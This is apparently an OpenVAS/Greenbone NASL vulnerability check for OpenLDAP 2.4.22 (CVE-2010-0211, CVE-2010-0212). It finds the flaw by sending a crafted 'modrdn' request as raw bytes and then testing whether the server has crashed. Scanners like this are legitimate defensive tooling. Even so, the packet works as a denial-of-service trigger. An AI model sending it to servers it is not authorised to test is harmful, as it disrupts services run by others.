if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100720" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_bugtraq_id( 41770 );
	script_cve_id( "CVE-2010-0211", "CVE-2010-0212" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2010-07-20 13:16:59 +0200 (Tue, 20 Jul 2010)" );
	script_name( "OpenLDAP 'modrdn' Request Multiple Vulnerabilities" );
	script_category( ACT_DENIAL );
	script_family( "General" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "ldap_detect.sc" );
	script_require_ports( "Services/ldap", 389, 636 );
	script_mandatory_keys( "ldap/detected" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/41770" );
	script_xref( name: "URL", value: "http://www.openldap.org/software/release/changes.html" );
	script_xref( name: "URL", value: "http://www.openldap.org/its/index.cgi/Software%20Bugs?id=6570" );
	script_tag( name: "solution", value: "The vendor has released an update to address this issue. Please see
  the references for more information." );
	script_tag( name: "summary", value: "OpenLDAP is prone to multiple vulnerabilities." );
	script_tag( name: "impact", value: "Successfully exploiting these issues allows remote attackers to
  execute arbitrary code in the context of the application or cause denial-of-service conditions." );
	script_tag( name: "affected", value: "OpenLDAP 2.4.22 is vulnerable. Other versions may also be affected." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
require("ldap.inc.sc");
port = ldap_get_port( default: 389 );
if(!ldap_alive( port: port )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
req = raw_string( 0x30, 0x0c, 0x02, 0x01, 0x01, 0x60, 0x07, 0x02, 0x01, 0x03, 0x04, 0x00, 0x80, 0x00 );
send( socket: soc, data: req );
buf = recv( socket: soc, length: 1 );
if(!buf){
	close( soc );
	exit( 0 );
}
response = hexstr( buf );
if(IsMatchRegexp( response, "^30$" )){
	req = raw_string( 0x30, 0x2a, 0x02, 0x01, 0x02, 0x6c, 0x25, 0x04, 0x18, 0x63, 0x6e, 0x3d, 0x73, 0x6f, 0x6d, 0x65, 0x74, 0x68, 0x69, 0x6e, 0x67, 0x2c, 0x64, 0x63, 0x3d, 0x61, 0x6e, 0x79, 0x74, 0x68, 0x69, 0x6e, 0x67, 0x04, 0x06, 0x63, 0x6e, 0x3d, 0x23, 0x38, 0x30, 0x01, 0x01, 0x00 );
	send( socket: soc, data: req );
	if(!ldap_alive( port: port )){
		security_message( port: port );
		exit( 0 );
	}
}
close( soc );
exit( 0 );

